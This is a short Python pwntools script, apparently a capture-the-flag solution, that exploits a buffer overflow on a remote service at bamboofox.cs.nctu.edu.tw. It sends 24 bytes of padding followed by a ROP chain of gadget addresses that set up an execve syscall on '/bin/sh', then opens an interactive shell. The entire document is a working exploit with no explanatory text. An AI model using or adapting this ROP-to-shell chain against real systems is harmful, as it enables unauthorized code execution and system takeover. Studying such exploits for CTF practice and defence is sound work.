
from pwn import *

# r = process('./foo_6')
r = remote('bamboofox.cs.nctu.edu.tw', 10108)

r.recvline()

popecx = 0x0806ea41    #: pop ecx; pop ebx; ret; 
popedx = 0x0806ea1a    #: pop edx; ret;
int80  = 0x0806f0df    #: nop; int 0x80; ret;
xoreax = 0x08054440    #: xor eax, eax; ret; 
add3   = 0x0808f620    #: add eax, 3; ret;
add2   = 0x0808f607    #: add eax, 2; ret;
NULL   = 0x80e9f70
binsh  = 0x80BE568

p = b'A' * 24
p += p32(xoreax)
p += p32(add3)
p += p32(add3)
p += p32(add3)
p += p32(add2)
p += p32(popecx)
p += p32(NULL)
p += p32(binsh)
p += p32(popedx)
p += p32(NULL)
p += p32(int80)

r.sendline(p)

r.interactive()

